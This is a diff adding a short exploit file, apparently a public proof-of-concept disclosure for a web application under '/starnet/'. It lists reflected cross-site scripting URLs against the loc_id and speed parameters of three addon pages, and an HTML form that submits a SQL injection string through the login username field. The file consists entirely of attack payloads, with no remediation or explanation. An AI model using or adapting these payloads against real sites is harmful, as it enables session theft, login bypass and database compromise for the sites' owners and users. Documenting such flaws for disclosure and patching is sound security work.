@@ -1,0 +1,20 @@
+Cross-site scripting:
+
+http://www.example.com/starnet/addons/page_slideshow.php?loc_id=1&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+
+http://www.example.com/starnet/addons/tv.php?loc_id=1&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+
+http://[host]/starnet/addons/scroll_page.php?speed=--%3E%3C/script%3E%3C/head%3E%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E
+
+
+Sql injection:
+
+[html]
+&lt;form action=&quot;http://www.example.com/index.php?section=4&amp;page=3&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user_username&quot; value=&quot;1&#039;SQL_CODE_HERE&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;user_password&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;option&quot; value=&quot;userlogin&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; name=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+[/html]
+
